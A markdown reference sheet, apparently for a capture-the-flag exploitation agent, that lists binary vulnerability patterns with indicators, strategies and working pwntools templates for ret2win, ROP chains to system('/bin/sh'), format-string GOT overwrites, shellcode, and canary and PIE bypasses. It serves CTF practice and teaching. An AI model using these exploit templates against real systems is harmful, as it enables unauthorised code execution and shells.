# PWN Vulnerability Patterns Reference

Quick-reference catalog for identifying common binary exploitation vulnerabilities from reconnaissance output.

## Architecture Selection

Detect architecture before choosing exploit primitives:

```python
from pwn import *
elf = ELF('/challenge/solve')
context.binary = elf
pack_addr = p64 if elf.bits == 64 else p32
```

Use `elf.arch`, `elf.bits`, `file /challenge/solve`, and `readelf -h /challenge/solve` to distinguish x86, x86_64, ARM, and AArch64. Do not reuse amd64-only gadgets, register names, offsets, or shellcode on ARM targets.

## ret2win

**Indicators:**
- `checksec` shows NX enabled, no canary (or canary irrelevant if we control return directly)
- `strings` or symbol table shows function names like: `win`, `flag`, `shell`, `cat_flag`, `get_flag`, `print_flag`
- Disassembly of the win function calls `system("/bin/cat /flag")` or `execve("/bin/sh")`
- `objdump -d` shows a `main` or `vuln` function with an obvious buffer overflow (e.g., `gets`, `read(0, buf, large_size)`)

**Exploit strategy:**
1. Find offset to return address (pattern create + pattern offset, or calculate from buffer size + saved rbp)
2. Pack address of win function with `p32` or `p64` according to `elf.bits`
3. If PIE enabled, need a leak first; if no PIE, address is fixed

**Example:**
```python
from pwn import *
elf = ELF('/challenge/solve')
context.binary = elf
p = process(elf.path)
offset = 40  # determined by pattern offset
win_addr = 0x401236  # from objdump
payload = b'A' * offset + (p64(win_addr) if elf.bits == 64 else p32(win_addr))
p.sendline(payload)
p.interactive()
```

## ROP (Return-Oriented Programming)

**Indicators:**
- NX enabled (no shellcode)
- No obvious win function in symbols/strings
- Stack overflow primitive exists
- Need to call `system("/bin/sh")` or `execve`

**Exploit strategy:**
1. Determine architecture and calling convention from `elf.arch`
2. Find architecture-appropriate gadgets with pwntools `ROP(elf)`, `ROPgadget`, or `ropper`
3. Find address of `system@plt` (from objdump) or `/bin/sh` string in binary
4. Build the chain using the detected architecture; `pop rdi; ret` is amd64-only and is not valid for ARM
5. If no `/bin/sh` string in binary, write it to a known writable address (bss) via `gets` or `read`

**Example:**
```python
from pwn import *
elf = ELF('/challenge/solve')
context.binary = elf
rop = ROP(elf)
# amd64 example only; choose different gadgets/calling convention on ARM.
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(elf.search(b'/bin/sh'))
payload = b'A' * offset + p64(pop_rdi) + p64(binsh) + p64(elf.plt['system'])
```

## Format String

**Indicators:**
- Disassembly shows `printf(user_buffer)` without a format string argument
- Or `fprintf`, `sprintf`, `dprintf` with user-controlled format
- No canary is common (but not required)

**Exploit strategy:**
1. Determine offset: send `AAAA%p.%p.%p...` and find where `0x41414141` appears
2. Choose target: overwrite GOT entry (e.g., `printf@got` → `system`) or return address
3. Write byte-by-byte with `%n`, `%hn`, or `%hhn`

**Use pwntools fmtstr module:**
```python
from pwn import *
elf = ELF('/challenge/solve')
context.binary = elf
p = process(elf.path)
writes = {elf.got['puts']: elf.symbols['win']}
payload = fmtstr_payload(offset, writes)
p.sendline(payload)
```

## Shellcode

**Indicators:**
- `checksec` shows NX disabled
- Writable + executable memory region exists
- Stack is executable (`readelf -l` shows `E` flag on stack)

**Exploit strategy:**
1. Find address of buffer (leak or fixed)
2. Generate shellcode with `context.binary = elf` so `shellcraft.sh()` uses the detected architecture
3. Jump to shellcode with an architecture-appropriate branch/gadget

**Example:**
```python
from pwn import *
elf = ELF('/challenge/solve')
context.binary = elf
shellcode = asm(shellcraft.sh())
p = process(elf.path)
buf_addr = 0x7fffffffde00  # from leak or fixed
payload = shellcode + b'A' * (offset - len(shellcode))
payload += p64(buf_addr) if elf.bits == 64 else p32(buf_addr)
p.sendline(payload)
p.interactive()
```

## Stack Canary Bypass

**Indicators:**
- `checksec` shows canary enabled
- Program leaks data (format string, buffer over-read)

**Exploit strategy:**
1. Leak canary value (format string or over-read)
2. Use canary in payload: `padding + canary + saved_rbp + target_addr`
3. Rest of exploit same as ret2win or ROP

## PIE Bypass

**Indicators:**
- `checksec` shows PIE enabled
- Need to leak code address first

**Exploit strategy:**
1. Leak a return address or GOT entry (format string or over-read)
2. Calculate base address: `leaked_addr - known_offset`
3. Recalculate all addresses: `base + function_offset`

## Tools Quick Reference

| Tool | Command | Purpose |
|------|---------|---------|
| file | `file /challenge/solve` | Binary type, arch, bits |
| checksec | `checksec /challenge/solve` | Protections: canary, NX, PIE, RELRO, FORTIFY |
| objdump | `objdump -d /challenge/solve` | Disassembly |
| strings | `strings /challenge/solve` | Embedded strings |
| readelf | `readelf -l /challenge/solve` | Program headers (exec stack?) |
| readelf | `readelf -s /challenge/solve` | Symbol table |
| ROPgadget | `ROPgadget --binary /challenge/solve` | Find ROP gadgets |
| ropper | `ropper -f /challenge/solve` | Alternative gadget finder |
| radare2 | `r2 -q -c 'aaa; pdf @main' /challenge/solve` | Full binary analysis |
| pwntools | `python3 -c "from pwn import *; ..."` | Exploit development |
